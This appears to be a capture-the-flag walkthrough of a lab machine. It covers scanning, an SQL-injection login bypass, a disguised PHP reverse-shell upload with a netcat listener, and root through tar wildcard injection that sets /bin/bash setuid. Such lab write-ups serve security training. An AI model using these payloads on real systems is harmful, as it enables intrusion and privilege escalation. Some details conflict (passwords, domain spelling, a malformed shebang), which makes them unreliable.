@@ -1,1 +1,389 @@
+					ENUMERATION
 
+----ifconfig----
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig                                         
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 7681748  bytes 10457799411 (9.7 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3947455  bytes 448716895 (427.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 309  bytes 31086 (30.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 309  bytes 31086 (30.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+----netdiscover----                                                                                                                         
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200 
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                         
+                                                                                                                         
+ 108 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 6480                                                      
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     16     960  Unknown vendor                                                        
+ 10.0.2.2        52:54:00:12:35:00     16     960  Unknown vendor                                                        
+ 10.0.2.3        08:00:27:15:1f:b5     16     960  PCS Systemtechnik GmbH                                                
+ 10.0.2.24       08:00:27:c9:ac:f6     15     900  PCS Systemtechnik GmbH                                                
+ 10.0.2.24       08:00:27:aa:84:13     15     900  PCS Systemtechnik GmbH                                                
+ 10.0.2.25       08:00:27:c9:ac:f6     15     900  PCS Systemtechnik GmbH                                                
+ 10.0.2.25       08:00:27:aa:84:13     15     900  PCS Systemtechnik GmbH                                                
+
+
+
+----nmap----                                                                                                                          
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nmap 10.0.2.25 -sS -sC -sV -A -T4       
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 01:10 +03
+Nmap scan report for 10.0.2.25
+Host is up (0.00081s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
+|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Quick Automative - Home
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+MAC Address: 08:00:27:C9:AC:F6 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.81 ms 10.0.2.25
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
+                                                           
+
+
+-----lets create an account to see the contents of the site as a normal user----- 
+
+username = abbas
+email = abbas@gmail.com 
+password = abbas12
+
+
+----here we see some user credentials in the contacts page, we can use one of these mail accounts to get into the system later on, for example nick greenhorn-----
+
+email = nick.greenhorn@guick.hmv
+
+
+
+
+----lets do web enum with gobuster-----
+
+
+
+					WEB ENUMERATION
+	
+
+gobuster                                                                                                                          
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.25 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,css,png,txt,jpg,jpeg
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.25
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              css,png,txt,jpg,jpeg,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.25/images/]
+/index.html           (Status: 200) [Size: 51414]
+/img                  (Status: 301) [Size: 304] [--> http://10.0.2.25/img/]
+/modules              (Status: 301) [Size: 308] [--> http://10.0.2.25/modules/]
+/careers              (Status: 301) [Size: 308] [--> http://10.0.2.25/careers/]
+/css                  (Status: 301) [Size: 304] [--> http://10.0.2.25/css/]
+/lib                  (Status: 301) [Size: 304] [--> http://10.0.2.25/lib/]
+/js                   (Status: 301) [Size: 303] [--> http://10.0.2.25/js/]
+/customer             (Status: 301) [Size: 309] [--> http://10.0.2.25/customer/]
+/404.html             (Status: 200) [Size: 5014]
+/404.css              (Status: 200) [Size: 871]
+/styles.css           (Status: 200) [Size: 4038]
+/robots.txt           (Status: 200) [Size: 32]
+/fonts                (Status: 301) [Size: 306] [--> http://10.0.2.25/fonts/]
+/employee             (Status: 301) [Size: 309] [--> http://10.0.2.25/employee/]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1764480 / 1764488 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+----there is an employee page, it is a login page for employees, we can try to login as an employee----
+
+
+----in the main page we saw the mail adress info@guick.hmv for contact, which is an employee's mail, 
+and we know that if we know the username and there is a vulnerability in the login form, we can perform an sql injection-----
+
+
+username = info@guick.hmv 
+
+password = whatever_you_write' OR 1=1#
+
+
+
+-----now we enter the system as an employer and it looks like we are also an admin given that we can now change employee paswords and their photos-----
+
+-----there is photo upload section here, we can upload a .php file to create a reverse connection-----
+
+-----Here we see that we can also change passwords, so if we change the photo of a user we know the name of and upload a reverse php file, 
+then we can change the password of the said user, login as him/her and create a reverse shell connection----
+
+-----I will change the photo of nick greenhorn-----
+
+-----In kali we can find webshell examples such as usr/share/webshells/php/php-reverse-shell.php, I copy this to the Desktop location-----
+
+
+cd /home/okina/Desktop
+
+//changed the name to shell.php 
+
+nano shell.php
+
+$ip = '10.0.2.15';  // CHANGE THIS SHOULD BE YOUR KALI IP
+$port = 1234;       // CHANGE THIS
+
+
+
+-----then we need to set up burpsuite before uploading the php file so we can listen and edit the responses-----
+
+
+We come to the admin panel, upload photo section. I chose nick user, I select my reverse 
+shell fle but dont upload it yet. First we will edit the response with our burpsuite 
+
+Open Burpsuite and then proxy -> intercept -> intercept on  
+
+Then we come to file upload and upload our php file 
+
+
+
+The response comes to our Burpsuite terminal so proxy works. We edit the response in the way below:
+
+Content-Type: application/x-php
+
+GIF89a; //This is so that we can check if our php connection works and we see transparent logo for our user
+
+<?php
+
+
+Then proxy -> intercept -> forward  and upload the shell file.
+
+
+
+----I open my nc listener, you can turn it on after you change the password, up to you -----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234             
+listening on [any] 1234 ...
+
+
+
+
+-----We change the photo, now lets change password and then log back in to trigger our connection. I choose user nick for this and I set the password to-----
+
+password = Mike.1234
+
+
+----I log out and then log back in with the credentials below-----
+
+email = nick.greenhorn@quick.hmv
+
+password = anan1234
+
+
+
+						
+					GAINING FOOTHOLD
+
+
+
+----come to our terminal and we see that we are in-----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234             
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.24] 40420
+Linux quick4 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 09:52:42 up 18 min,  0 users,  load average: 0.16, 0.18, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ hostname
+quick4
+$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:aa:84:13 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.25/24 metric 100 brd 10.0.2.255 scope global dynamic enp0s3
+       valid_lft 351sec preferred_lft 351sec
+    inet6 fe80::a00:27ff:feaa:8413/64 scope link 
+       valid_lft forever preferred_lft forever
+3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:c9:ac:f6 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.24/24 metric 100 brd 10.0.2.255 scope global dynamic enp0s8
+       valid_lft 348sec preferred_lft 348sec
+    inet6 fe80::a00:27ff:fec9:acf6/64 scope link 
+       valid_lft forever preferred_lft forever
+
+
+----lets check home directory-----
+
+$ cd /home
+$ ls
+andrew
+coos
+jeff
+john
+juan
+lara
+lee
+mike
+nick
+user.txt
+$ cat user.txt
+----User Flag----
+
+
+
+----lets navigate through the system, search for vulnerabilities to exploit----
+
+
+$ sudo -l                 
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+*/1 *	* * *   root    /usr/local/bin/backup.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+----not much from sudo -l but from te crontab we see that there is a script in location /usr/local/bin named backup.sh that is executed every minute
+Check the privileges of the file----
+
+
+$ ls -la /usr/local/bin/backup.sh
+-rwxr--r-- 1 root root 75 Feb 12 06:32 /usr/local/bin/backup.sh
+
+
+----lets look at it context----
+
+$ cat /usr/local/bin/backup.sh
+#!/bin/bash
+cd /var/www/html/
+tar czf /var/backups/backup-website.tar.gz *
+
+
+----from here we understand that this script goes to var/www/html and archive all the files in var/backups/ location
+with tar, then names them backup-website.tar.gz 
+We see a * which is a wildcard and we can exploit this. If we put a reverse shell in this location tar will archive it alongside other files,
+then we will be able to do a wildcard injection----
+
+
+
+
+					PRIVILEGE ESCALATION
+
+
+---For this we will use setuid bit---
+
+cd /var/www/html
+
+$ echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh  
+
+
+---then checkpoint parameters that can be used for tar wildcard injection---
+
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"  
+
+
+$ echo "" > --checkpoint=1
+
+
+---check our privileges---
+
+
+$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+
+$ /bin/bash -p
+
+-p: --privileged 
+
+whoami
+root
+
+
+----boom, we are Root, lets find the flag----
+
+
+cd /root
+ls
+dash
+root.txt
+snap
+cat root.txt
+---Root User Flag----
